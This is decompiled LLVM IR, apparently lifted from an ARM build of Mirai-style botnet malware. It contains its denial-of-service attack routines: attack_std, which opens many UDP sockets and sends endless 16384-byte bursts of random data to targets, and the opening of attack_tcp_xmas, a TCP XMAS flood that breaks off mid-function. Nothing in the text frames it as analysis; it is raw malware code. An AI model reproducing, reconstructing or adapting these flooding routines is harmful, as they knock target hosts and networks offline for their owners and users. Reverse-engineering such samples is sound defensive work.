  %v3_9540 = load i32, i32* %stack_var_-44, align 4
  %v5_9548 = mul i32 %v3_9540, 24
  %v0_954c = load i32, i32* %r4.global-to-local, align 4
  %v1_954c = and i32 %v0_954c, 16711680
  store i32 %v1_954c, i32* %ip.global-to-local, align 4
  %v3_9550 = udiv i32 %v0_954c, 16777216
  %v4_9554 = udiv i32 %v1_954c, 256
  %v5_9554 = or i32 %v4_9554, %v3_9550
  store i32 %v5_9554, i32* %r2.global-to-local, align 4
  %v1_9558 = load i32, i32* @sb, align 4
  %v2_9558 = add i32 %v1_9558, %v5_9548
  store i32 %v2_9558, i32* %r1.global-to-local, align 4
  %v1_955c = and i32 %v0_954c, 65280
  store i32 %v1_955c, i32* %r3.global-to-local, align 4
  %v1_9560 = add i32 %v2_9558, 20
  %v2_9560 = inttoptr i32 %v1_9560 to i8*
  %v3_9560 = load i8, i8* %v2_9560, align 1
  %v4_9560 = zext i8 %v3_9560 to i32
  store i32 %v4_9560, i32* %ip.global-to-local, align 4
  %v5_9568 = call i32 @llvm.bswap.i32(i32 %v0_954c)
  %v7_956c = lshr i32 %v0_953c, %v4_9560
  %v8_956c = add i32 %v7_956c, %v5_9568
  store i32 %v8_956c, i32* %r2.global-to-local, align 4
  store i32 %v6_917c, i32* %r1.global-to-local, align 4
  %v5_9588 = call i32 @llvm.bswap.i32(i32 %v8_956c)
  store i32 %v5_9588, i32* %r3.global-to-local, align 4
  store i1 %v7_943c, i1* %cpsr_z.global-to-local, align 1
  %v1_9590 = load i32, i32* @r5, align 4
  %v2_9590 = add i32 %v1_9590, 16
  %v3_9590 = inttoptr i32 %v2_9590 to i32*
  store i32 %v5_9588, i32* %v3_9590, align 4
  br i1 %v2_943c, label %dec_label_pc_9598, label %dec_label_pc_9444

dec_label_pc_9598:                                ; preds = %dec_label_pc_9538, %dec_label_pc_9438
  %v0_9598 = call i32 @rand_next()
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r4.global-to-local, align 4
  %v0_95a4 = load i32, i32* @fp, align 4
  %v9_95a4 = icmp eq i32 %v0_95a4, add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1)
  store i1 %v9_95a4, i1* %cpsr_z.global-to-local, align 1
  %v1_95a8 = load i32, i32* @r5, align 4
  %v2_95a8 = add i32 %v1_95a8, 12
  %v3_95a8 = inttoptr i32 %v2_95a8 to i32*
  store i32 %v0_9598, i32* %v3_95a8, align 4
  br i1 %v9_95a4, label %dec_label_pc_95b0, label %dec_label_pc_9598.dec_label_pc_9454_crit_edge

dec_label_pc_9598.dec_label_pc_9454_crit_edge:    ; preds = %dec_label_pc_9598
  %v1_9458.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9454

dec_label_pc_95b0:                                ; preds = %dec_label_pc_9598, %dec_label_pc_9444
  %v0_95b0 = call i32 @rand_next()
  %v3_95b8 = urem i32 %v0_95b0, 65536
  store i32 %v3_91dc, i32* %r2.global-to-local, align 4
  %v1_95c4 = sub nsw i32 999, %v3_95b8
  store i32 %v1_95c4, i32* %r3.global-to-local, align 4
  %v1_95c8 = load i32, i32* %r4.global-to-local, align 4
  %v9_95c8 = icmp eq i32 %v3_91dc, %v1_95c8
  store i1 %v9_95c8, i1* %cpsr_z.global-to-local, align 1
  %v1_95cc = trunc i32 %v0_95b0 to i16
  %v2_95cc = load i32, i32* @r5, align 4
  %v3_95cc = add i32 %v2_95cc, 4
  %v4_95cc = inttoptr i32 %v3_95cc to i16*
  store i16 %v1_95cc, i16* %v4_95cc, align 2
  %v0_95d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_95d0 = trunc i32 %v0_95d0 to i16
  %v2_95d0 = load i32, i32* @r6, align 4
  %v3_95d0 = add i32 %v2_95d0, 4
  %v4_95d0 = inttoptr i32 %v3_95d0 to i16*
  store i16 %v1_95d0, i16* %v4_95d0, align 2
  br i1 %v9_95c8, label %dec_label_pc_95d8, label %dec_label_pc_95b0.dec_label_pc_9460_crit_edge

dec_label_pc_95b0.dec_label_pc_9460_crit_edge:    ; preds = %dec_label_pc_95b0
  %v1_9464.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9460

dec_label_pc_95d8:                                ; preds = %dec_label_pc_95b0, %dec_label_pc_9454
  %v0_95d8 = call i32 @rand_next()
  %v1_95d8 = trunc i32 %v0_95d8 to i16
  store i32 %v3_91e0, i32* %r3.global-to-local, align 4
  %v1_95e0 = load i32, i32* %r4.global-to-local, align 4
  %v9_95e0 = icmp eq i32 %v3_91e0, %v1_95e0
  store i1 %v9_95e0, i1* %cpsr_z.global-to-local, align 1
  %v3_95e4 = load i32, i32* @r5, align 4
  %v4_95e4 = add i32 %v3_95e4, 44
  %v5_95e4 = inttoptr i32 %v4_95e4 to i16*
  store i16 %v1_95d8, i16* %v5_95e4, align 2
  br i1 %v9_95e0, label %dec_label_pc_95ec, label %dec_label_pc_946c

dec_label_pc_95ec:                                ; preds = %dec_label_pc_95d8, %dec_label_pc_9460
  %v0_95ec = call i32 @rand_next()
  %v1_95ec = trunc i32 %v0_95ec to i16
  store i32 %v1_91d4, i32* @r4, align 4
  store i1 %v2_95f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_95f4, label %.thread30, label %bb83

.thread30:                                        ; preds = %dec_label_pc_95ec
  %v3_95fc31 = load i32, i32* @r7, align 4
  %v4_95fc32 = add i32 %v3_95fc31, 2
  %v5_95fc33 = inttoptr i32 %v4_95fc32 to i16*
  store i16 %v1_95ec, i16* %v5_95fc33, align 2
  br label %dec_label_pc_9608

bb83:                                             ; preds = %dec_label_pc_95ec
  %v1_95f8 = load i32, i32* @r5, align 4
  %v2_95f8 = add i32 %v1_95f8, 16
  %v3_95f8 = inttoptr i32 %v2_95f8 to i32*
  %v4_95f8 = load i32, i32* %v3_95f8, align 4
  store i32 %v4_95f8, i32* %r3.global-to-local, align 4
  %v3_95fc = load i32, i32* @r7, align 4
  %v4_95fc = add i32 %v3_95fc, 2
  %v5_95fc = inttoptr i32 %v4_95fc to i16*
  store i16 %v1_95ec, i16* %v5_95fc, align 2
  %v1_9600 = load i32, i32* %r3.global-to-local, align 4
  %v2_9600 = load i32, i32* @r6, align 4
  %v3_9600 = add i32 %v2_9600, 16
  %v4_9600 = inttoptr i32 %v3_9600 to i32*
  store i32 %v1_9600, i32* %v4_9600, align 4
  br label %dec_label_pc_9480

dec_label_pc_9608:                                ; preds = %.thread30, %dec_label_pc_946c
  %v0_9608 = call i32 @rand_next()
  store i32 %v1_9148, i32* %r1.global-to-local, align 4
  store i1 %v2_9610, i1* %cpsr_z.global-to-local, align 1
  %v1_9614 = load i32, i32* @r6, align 4
  %v2_9614 = add i32 %v1_9614, 16
  %v3_9614 = inttoptr i32 %v2_9614 to i32*
  store i32 %v0_9608, i32* %v3_9614, align 4
  br i1 %v2_9610, label %dec_label_pc_948c, label %dec_label_pc_961c

dec_label_pc_961c:                                ; preds = %dec_label_pc_9480, %dec_label_pc_9608
  %v0_961c = load i32, i32* @r7, align 4
  %v1_961c = add i32 %v0_961c, 8
  store i32 %v6_9128, i32* %r1.global-to-local, align 4
  %v2_9624 = inttoptr i32 %v1_961c to i16*
  %v3_9624 = call i32 @rand_str(i16* %v2_9624, i32 %v6_9128)
  br label %dec_label_pc_948c

dec_label_pc_962c:                                ; preds = %dec_label_pc_91a0
  %v1_9630 = call i32 @__GI___libc_close(i32 %v3_9190)
  br label %dec_label_pc_9634

dec_label_pc_9634:                                ; preds = %entry, %dec_label_pc_962c
  %v1_963c = phi i32 [ %v3_9190, %entry ], [ %v1_9630, %dec_label_pc_962c ]
  store i32 %v3_9040, i32* %r4.global-to-local, align 4
  store i32 %v6_9040, i32* %r5.global-to-local, align 4
  store i32 %v24_9040, i32* %fp.global-to-local, align 4
  ret i32 %v1_963c

dec_label_pc_9640:                                ; preds = %dec_label_pc_91c8
  store i32 %v6_9128, i32* %r2.global-to-local, align 4
  %v1_9648 = add i32 %v6_9128, 8
  store i32 %v1_9648, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_93fc.preheader

; uselistorder directives
  uselistorder i32 %v1_9648, { 1, 0 }
  uselistorder i16 %v1_95ec, { 1, 0 }
  uselistorder i32 %v0_95b0, { 1, 0 }
  uselistorder i32 %v5_9588, { 1, 0 }
  uselistorder i32 %v0_954c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_9528, { 1, 2, 0 }
  uselistorder i32 %v1_9524, { 2, 0, 3, 1 }
  uselistorder i32 %v3_94d8, { 1, 0, 2 }
  uselistorder i32 %v0_94c0, { 1, 0, 2, 3 }
  uselistorder i32 %v7_9424, { 1, 0, 2 }
  uselistorder i1 %v7_943c, { 2, 1, 0 }
  uselistorder i1 %v2_9610, { 2, 3, 1, 0 }
  uselistorder i1 %v2_95f4, { 2, 3, 1, 0 }
  uselistorder i32 %v0_9398, { 1, 0 }
  uselistorder i32 %v4_930c13, { 1, 0 }
  uselistorder i32 %v3_9230, { 1, 0 }
  uselistorder i32 %v3_9214, { 1, 2, 0 }
  uselistorder i32 %v1_9210, { 1, 0 }
  uselistorder i32 %v1_91d4, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_91d0, { 1, 0, 3, 2 }
  uselistorder i32 %v0_91cc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_91c8, { 1, 0, 2, 3 }
  uselistorder i1 %v7_91c0, { 1, 0 }
  uselistorder i1 %v7_9194, { 1, 0 }
  uselistorder i32 %v3_9190, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v6_917c, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_9148, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_9128, { 7, 6, 5, 4, 1, 3, 2, 0 }
  uselistorder i32 %v1_90dc, { 1, 2, 0 }
  uselistorder i32 %v1_90b8, { 3, 2, 1, 0 }
  uselistorder i32 %v6_90b0, { 1, 0 }
  uselistorder i32 %v6_9074, { 2, 1, 3, 0 }
  uselistorder i32 %v2_905c, { 0, 3, 1, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 6, 5, 7, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 25, 24, 26, 27, 29, 28, 30, 31, 33, 32, 35, 34, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9634, { 1, 0 }
  uselistorder label %dec_label_pc_961c, { 1, 0 }
  uselistorder label %dec_label_pc_948c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_93fc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_93fc.preheader, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
}

define i32 @attack_std(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v18_965c = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_9678 = call i32 @calloc(i32 %arg1, i32 4)
  store i32 %v2_9678, i32* @sl, align 4
  %v0_9684 = load i32, i32* @r7, align 4
  %v2_9688 = call i32 @calloc(i32 %v0_9684, i32 4)
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* @r4, align 4
  %v0_9694 = load i32, i32* @r6, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 %v2_9688, i32* @r8, align 4
  %v0_96a4 = load i32, i32* @r5, align 4
  %v5_96a8 = inttoptr i32 %v0_9694 to i32*
  %v6_96a8 = call i32 @attack_get_opt_int(i32 %v0_96a4, i32* %v5_96a8, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 ptrtoint (i32* @0 to i32))
  %v3_96b0 = urem i32 %v6_96a8, 65536
  %v0_96b4 = load i32, i32* @r6, align 4
  %v0_96bc = load i32, i32* @r4, align 4
  store i32 %v0_96bc, i32* %r3.global-to-local, align 4
  %v0_96c0 = load i32, i32* @r5, align 4
  %v5_96c8 = inttoptr i32 %v0_96b4 to i32*
  %v6_96c8 = call i32 @attack_get_opt_int(i32 %v0_96c0, i32* %v5_96c8, i32 6, i32 %v0_96bc, i32 %v3_96b0)
  %v0_96cc = load i32, i32* @r6, align 4
  %v3_96d0 = mul i32 %v6_96c8, 65536
  store i32 %v3_96d0, i32* %sb.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v0_96dc = load i32, i32* @r5, align 4
  %v5_96e0 = inttoptr i32 %v0_96cc to i32*
  %v6_96e0 = call i32 @attack_get_opt_int(i32 %v0_96dc, i32* %v5_96e0, i32 0, i32 1024, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_96f0 = load i32, i32* @r6, align 4
  %v0_96f4 = load i32, i32* @r5, align 4
  %v3_96f8 = urem i32 %v6_96e0, 65536
  store i32 %v3_96f8, i32* @r5, align 4
  %v5_96fc = inttoptr i32 %v0_96f0 to i32*
  %v6_96fc = call i32 @attack_get_opt_int(i32 %v0_96f4, i32* %v5_96fc, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v0_9700 = load i32, i32* %sb.global-to-local, align 4
  %v3_9700 = udiv i32 %v0_9700, 65536
  store i32 %v3_9700, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_9708 = load i32, i32* @r4, align 4
  %v9_9708 = icmp eq i32 %v3_9700, %v1_9708
  br i1 %v9_9708, label %dec_label_pc_9738, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v4_9720 = udiv i32 %v0_9700, 16777216
  store i32 %v4_9720, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9748

dec_label_pc_9738:                                ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v0_9738 = call i32 @rand_next()
  br label %dec_label_pc_9748

dec_label_pc_9748:                                ; preds = %bb, %dec_label_pc_9738
  %v0_972c10 = urem i32 %v6_96fc, 256
  %v0_9748 = load i32, i32* @r7, align 4
  %v2_9748 = icmp eq i32 %v0_9748, 0
  br i1 %v2_9748, label %dec_label_pc_9888, label %dec_label_pc_9750

dec_label_pc_9750:                                ; preds = %dec_label_pc_9748
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_97fc = udiv i32 %v3_96b0, 256
  %v1_97f8 = mul i32 %v6_96a8, 256
  %v4_9800 = and i32 %v1_97f8, 65280
  %v5_9800 = or i32 %v4_9800, %v3_97fc
  %v2_9780 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_97e0

dec_label_pc_9760:                                ; preds = %bb51, %dec_label_pc_9820
  %v3_976c = call i32 @socket(i32 2, i32 2, i32 0)
  %v7_9774 = icmp eq i32 %v3_976c, -1
  %v0_9778 = load i32, i32* @sb, align 4
  %v1_9778 = add i32 %v0_9778, 1
  store i32 %v1_9778, i32* @sb, align 4
  %v0_977c = load i32, i32* @fp, align 4
  %v1_977c = add i32 %v0_977c, 24
  store i32 %v1_977c, i32* @fp, align 4
  %v2_9788 = load i32, i32* @r8, align 4
  %v3_9788 = add i32 %v2_9788, %stack_var_-60.0
  %v4_9788 = inttoptr i32 %v3_9788 to i32*
  store i32 %v3_976c, i32* %v4_9788, align 4
  br i1 %v7_9774, label %dec_label_pc_987c, label %dec_label_pc_9790

dec_label_pc_9790:                                ; preds = %dec_label_pc_9760
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v3_97a8 = call i32 @bind(i32 %v3_976c, i32 %v2_9780, i32 16)
  %v0_97ac = load i32, i32* @r6, align 4
  %v1_97ac = add i32 %v0_97ac, 20
  %v2_97ac = inttoptr i32 %v1_97ac to i8*
  %v3_97ac = load i8, i8* %v2_97ac, align 1
  %v4_97ac = zext i8 %v3_97ac to i32
  store i32 %v4_97ac, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_97ac, 32
  br i1 %tmp, label %dec_label_pc_9834, label %dec_label_pc_97b8

dec_label_pc_97b8:                                ; preds = %dec_label_pc_9790, %dec_label_pc_9834
  %v0_97bc = phi i32 [ %v0_97ac, %dec_label_pc_9790 ], [ %v0_97bc.pre, %dec_label_pc_9834 ]
  %v1_97c0 = load i32, i32* @r8, align 4
  %v2_97c0 = add i32 %v1_97c0, %stack_var_-60.0
  %v3_97c0 = inttoptr i32 %v2_97c0 to i32*
  %v4_97c0 = load i32, i32* %v3_97c0, align 4
  %v3_97c8 = call i32 @__libc_connect(i32 %v4_97c0, i32 %v0_97bc, i32 16)
  %v0_97d0 = load i32, i32* @sb, align 4
  %v1_97d0 = load i32, i32* @r7, align 4
  %v9_97d0 = icmp eq i32 %v0_97d0, %v1_97d0
  %v1_97d4 = add i32 %stack_var_-60.0, 4
  store i32 %v1_97d4, i32* %r3.global-to-local, align 4
  br i1 %v9_97d0, label %dec_label_pc_9888, label %dec_label_pc_97e0

dec_label_pc_97e0:                                ; preds = %dec_label_pc_97b8, %dec_label_pc_9750
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_9750 ], [ %v1_97d4, %dec_label_pc_97b8 ]
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* @r4, align 4
  %v2_97f0 = call i32 @calloc(i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 1)
  store i32 %v5_9800, i32* %r3.global-to-local, align 4
  %v1_980c = load i32, i32* @r4, align 4
  %v9_980c = icmp eq i32 %v3_96b0, %v1_980c
  %v1_9810 = load i32, i32* @fp, align 4
  %v2_9810 = add i32 %v1_9810, %arg2
  store i32 %v2_9810, i32* @r6, align 4
  %v2_9814 = load i32, i32* @sl, align 4
  %v3_9814 = add i32 %v2_9814, %stack_var_-60.0
  %v4_9814 = inttoptr i32 %v3_9814 to i32*
  store i32 %v2_97f0, i32* %v4_9814, align 4
  br i1 %v9_980c, label %dec_label_pc_9820, label %bb51

bb51:                                             ; preds = %dec_label_pc_97e0
  %v1_9818 = load i32, i32* %r3.global-to-local, align 4
  %v2_9818 = trunc i32 %v1_9818 to i16
  %v3_9818 = load i32, i32* @r6, align 4
  %v4_9818 = add i32 %v3_9818, 2
  %v5_9818 = inttoptr i32 %v4_9818 to i16*
  store i16 %v2_9818, i16* %v5_9818, align 2
  br label %dec_label_pc_9760

dec_label_pc_9820:                                ; preds = %dec_label_pc_97e0
  %v0_9820 = call i32 @rand_next()
  %v1_9820 = trunc i32 %v0_9820 to i16
  %v0_9828 = load i32, i32* @fp, align 4
  %v2_9828 = add i32 %v0_9828, %arg2
  store i32 %v2_9828, i32* @r6, align 4
  %v4_982c = add i32 %v2_9828, 2
  %v5_982c = inttoptr i32 %v4_982c to i16*
  store i16 %v1_9820, i16* %v5_982c, align 2
  br label %dec_label_pc_9760

dec_label_pc_9834:                                ; preds = %dec_label_pc_9790
  %v1_9834 = add i32 %v0_97ac, 16
  %v2_9834 = inttoptr i32 %v1_9834 to i32*
  %v3_9834 = load i32, i32* %v2_9834, align 4
  store i32 %v3_9834, i32* @r4, align 4
  %v0_9838 = call i32 @rand_next()
  %v0_983c = load i32, i32* @r4, align 4
  %v1_9848 = and i32 %v0_983c, 65280
  store i32 %v1_9848, i32* %r3.global-to-local, align 4
  %v0_9850 = load i32, i32* @r6, align 4
  %v1_9850 = add i32 %v0_9850, 20
  %v2_9850 = inttoptr i32 %v1_9850 to i8*
  %v3_9850 = load i8, i8* %v2_9850, align 1
  %v4_9850 = zext i8 %v3_9850 to i32
  %v5_9854 = call i32 @llvm.bswap.i32(i32 %v0_983c)
  %v7_9858 = lshr i32 %v0_9838, %v4_9850
  %v8_9858 = add i32 %v7_9858, %v5_9854
  %v5_9870 = call i32 @llvm.bswap.i32(i32 %v8_9858)
  store i32 %v5_9870, i32* %r3.global-to-local, align 4
  %v2_9874 = add i32 %v0_9850, 4
  %v3_9874 = inttoptr i32 %v2_9874 to i32*
  store i32 %v5_9870, i32* %v3_9874, align 4
  %v0_97bc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_97b8

dec_label_pc_987c:                                ; preds = %dec_label_pc_9760
  store i32 %v18_965c, i32* %sb.global-to-local, align 4
  ret i32 %v3_976c

dec_label_pc_9888:                                ; preds = %dec_label_pc_97b8, %dec_label_pc_9748
  %v1_98c822 = phi i32 [ 0, %dec_label_pc_9748 ], [ %v0_97d0, %dec_label_pc_97b8 ]
  %v2_988c = icmp eq i32 %v0_972c10, 0
  br i1 %v2_988c, label %dec_label_pc_98ac.outer, label %dec_label_pc_98c4

dec_label_pc_989c:                                ; preds = %dec_label_pc_98ac
  store i32 %v1_98a0, i32* @r4, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_989c = load i32, i32* @r8, align 4
  %v4_989c = mul i32 %v1_98a0, 4
  %v5_989c = add i32 %v0_989c, %v4_989c
  %v6_989c = inttoptr i32 %v5_989c to i32*
  %v7_989c = load i32, i32* %v6_989c, align 4
  %v0_98a0 = load i32, i32* @sl, align 4
  %v5_98a0 = add i32 %v0_98a0, %v4_989c
  %v6_98a0 = inttoptr i32 %v5_98a0 to i32*
  %v7_98a0 = load i32, i32* %v6_98a0, align 4
  %v4_98a4 = call i32 @__libc_send(i32 %v7_989c, i32 %v7_98a0, i32 %v0_98b0, i32 16384)
  %v0_98a8 = load i32, i32* @r4, align 4
  %v1_98a8 = add i32 %v0_98a8, 1
  %v0_98ac.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_98ac.outer

dec_label_pc_98ac.outer:                          ; preds = %dec_label_pc_9888, %dec_label_pc_989c
  %v0_98ac.ph = phi i32 [ %v0_98ac.pre.pre, %dec_label_pc_989c ], [ %v1_98c822, %dec_label_pc_9888 ]
  %v1_98a0.ph = phi i32 [ %v1_98a8, %dec_label_pc_989c ], [ 0, %dec_label_pc_9888 ]
  %v0_98b0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_98ac

dec_label_pc_98ac:                                ; preds = %dec_label_pc_98ac.outer, %dec_label_pc_98ac
  %v1_98a0 = phi i32 [ 0, %dec_label_pc_98ac ], [ %v1_98a0.ph, %dec_label_pc_98ac.outer ]
  %v8_98b8 = icmp sgt i32 %v0_98ac.ph, %v1_98a0
  br i1 %v8_98b8, label %dec_label_pc_989c, label %dec_label_pc_98ac

dec_label_pc_98c4:                                ; preds = %dec_label_pc_98c8, %dec_label_pc_9888
  %v1_98c821 = phi i32 [ %v1_98c822, %dec_label_pc_9888 ], [ %v1_98c8, %dec_label_pc_98c8 ]
  br label %dec_label_pc_98c8

dec_label_pc_98c8:                                ; preds = %dec_label_pc_98d4, %dec_label_pc_98c4
  %v1_98c8 = phi i32 [ %v1_98c821, %dec_label_pc_98c4 ], [ %v1_98c8.pre, %dec_label_pc_98d4 ]
  %v1_98d4 = phi i32 [ 0, %dec_label_pc_98c4 ], [ %v1_98f4, %dec_label_pc_98d4 ]
  store i32 %v1_98d4, i32* @r6, align 4
  %v6_98d0 = icmp slt i32 %v1_98d4, %v1_98c8
  br i1 %v6_98d0, label %dec_label_pc_98d4, label %dec_label_pc_98c4

dec_label_pc_98d4:                                ; preds = %dec_label_pc_98c8
  %v0_98cc = load i32, i32* @r5, align 4
  %v0_98d4 = load i32, i32* @sl, align 4
  %v4_98d4 = mul i32 %v1_98d4, 4
  %v5_98d4 = add i32 %v0_98d4, %v4_98d4
  %v6_98d4 = inttoptr i32 %v5_98d4 to i32*
  %v7_98d4 = load i32, i32* %v6_98d4, align 4
  store i32 %v7_98d4, i32* @r4, align 4
  %v2_98dc = inttoptr i32 %v7_98d4 to i16*
  %v3_98dc = call i32 @rand_str(i16* %v2_98dc, i32 %v0_98cc)
  %v0_98e0 = load i32, i32* @r8, align 4
  %v1_98e0 = load i32, i32* @r6, align 4
  %v4_98e0 = mul i32 %v1_98e0, 4
  %v5_98e0 = add i32 %v4_98e0, %v0_98e0
  %v6_98e0 = inttoptr i32 %v5_98e0 to i32*
  %v7_98e0 = load i32, i32* %v6_98e0, align 4
  %v0_98e4 = load i32, i32* @r4, align 4
  %v0_98e8 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_98f0 = call i32 @__libc_send(i32 %v7_98e0, i32 %v0_98e4, i32 %v0_98e8, i32 16384)
  %v0_98f4 = load i32, i32* @r6, align 4
  %v1_98f4 = add i32 %v0_98f4, 1
  %v1_98c8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_98c8

; uselistorder directives
  uselistorder i32 %v1_98c8, { 1, 0 }
  uselistorder i32 %v1_98a0, { 2, 1, 0 }
  uselistorder i32 %v5_9870, { 1, 0 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_97ac, { 1, 0, 2 }
  uselistorder i32 %v3_976c, { 1, 3, 2, 0 }
  uselistorder i32 %v3_9700, { 1, 0 }
  uselistorder i32 %v3_96b0, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 1, 3, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 8, 9, 5, 6, 7, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_98ac, { 1, 0 }
  uselistorder label %dec_label_pc_98ac.outer, { 1, 0 }
  uselistorder label %dec_label_pc_97b8, { 1, 0 }
  uselistorder label %dec_label_pc_9760, { 1, 0 }
  uselistorder label %dec_label_pc_9748, { 1, 0 }
}

define i32 @attack_tcp_xmas(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i16 @__decompiler_undefined_function_3()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_98fc = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_9918 = call i32 @calloc(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_9924 = load i32, i32* @r6, align 4
  store i32 %v0_9924, i32* %r0.global-to-local, align 4
  %v2_9928 = call i32 @calloc(i32 %v0_9924, i32 4)
  %v0_992c = load i32, i32* @r5, align 4
  store i32 %v0_992c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_993c = load i32, i32* @r4, align 4
  store i32 %v0_993c, i32* %r0.global-to-local, align 4
  %v5_9940 = inttoptr i32 %v0_992c to i32*
  %v6_9940 = call i32 @attack_get_opt_int(i32 %v0_993c, i32* %v5_9940, i32 2, i32 0, i32 %v2_9928)
  %v1_994c = urem i32 %v6_9940, 256
  store i32 %v1_994c, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_9958 = load i32, i32* @r5, align 4
  store i32 %v0_9958, i32* %r1.global-to-local, align 4
  %v0_995c = load i32, i32* @r4, align 4
  store i32 %v0_995c, i32* %r0.global-to-local, align 4
  %v5_9960 = trunc i32 %v6_9940 to i8
  %v6_9964 = inttoptr i32 %v0_9958 to i32*
